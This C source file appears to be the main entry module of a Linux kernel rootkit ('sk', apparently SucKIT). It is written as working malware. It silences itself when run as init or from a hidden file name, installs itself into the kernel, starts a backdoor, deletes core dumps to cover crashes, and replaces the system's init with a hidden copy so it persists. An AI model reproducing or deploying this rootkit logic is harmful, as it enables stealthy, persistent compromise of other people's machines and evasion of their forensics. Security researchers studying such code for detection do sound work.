/*
 * $Id: the main sk stuff
 */

#include "stuff.h"

int	silent = 0;	/* silent flag - when installing from init or such */

int main(int argc, char *argv[], char *envp[]);

/* libc emulation */
void	_start(char *argv, ...)
{
        int     i = 0;
	char	*p;
        va_list ap;

        va_start(ap, argv);
        do {
                i++;
                p = va_arg(ap, char *);
        } while (p);

	_exit(main(i, &argv, (void *) ap));
}


/* this is our main() entry */
int main(int argc, char *argv[], char *envp[])
{
	int i, ret = 0;

	/* test whether we should shut up
	   thats possible in two cases - when invoked as "init" or invoked
	   from hidden file name */
	if ((getpid() == 1) ||
	    (!strcmp((argv[0] + strlen(argv[0]) - (sizeof(HIDESTR)-1)),
	     HIDESTR)))
		silent = 1;

	printf("%s\n", BANNER);

	i = fork();
	if (!i) {
		if (installed()) {
			ret = client(argc, argv);
			return 0;
		}
		if (install())
			return 1;
		if (backdoor_init())
			return 1;
		return 0;
	}
	waitpid(i, &ret, 0);

	/* segv ? */
	if (ret & 0x7f) {
		/* huh-huh, could be done with setrlimit too, but ... ;P */
		unlink("core");
		printf("\nFUCK: Got signal %d while manipulating kernel!\n", ret & 0x7f);
	}

	ret = (ret & 0xff00) >> 8;

	if (getpid() == 1) {
		sk_io	b;
		skio(CMD_COMMHACK, &b);
		ret = execve("/sbin/init" HIDESTR, argv, envp);
		if (ret < 0) {
			while (1) { };
		}
	}
	return ret;
}
